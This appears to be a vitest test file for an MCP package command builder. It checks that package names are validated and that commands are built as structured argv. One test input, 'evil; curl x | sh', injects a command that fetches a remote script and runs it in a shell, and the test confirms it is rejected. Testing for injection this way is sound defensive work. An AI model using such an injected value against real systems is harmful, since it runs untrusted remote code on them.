import { describe, expect, it } from 'vitest';
import { buildMcpPackageCommand } from './packages.js';
import type { McpPackage } from '../lib/types.js';

function mcpPackage(pkg: Partial<McpPackage>): McpPackage {
  return {
    registry_name: pkg.registry_name || pkg.name || 'pkg',
    name: pkg.name || pkg.registry_name || 'pkg',
    ...pkg,
  };
}

describe('buildMcpPackageCommand', () => {
  it('rejects malicious registry package names before building argv', () => {
    expect(() => buildMcpPackageCommand(mcpPackage({
      name: 'evil; curl x | sh',
      runtime: 'node',
    }))).toThrow('Invalid npm package spec');
  });

  it('rejects unsupported runtimes instead of falling through to raw package names', () => {
    expect(() => buildMcpPackageCommand(mcpPackage({
      name: 'safe-package',
      runtime: 'binary',
    }))).toThrow('Unsupported MCP runtime: binary. Supported: node, python.');
  });

  it('builds structured argv for valid npm specs', () => {
    expect(buildMcpPackageCommand(mcpPackage({
      name: '@scope/safe-package@1.2.3',
      runtime: 'node',
    }))).toEqual({
      command: 'npx',
      args: ['-y', '@scope/safe-package@1.2.3'],
    });
  });
});
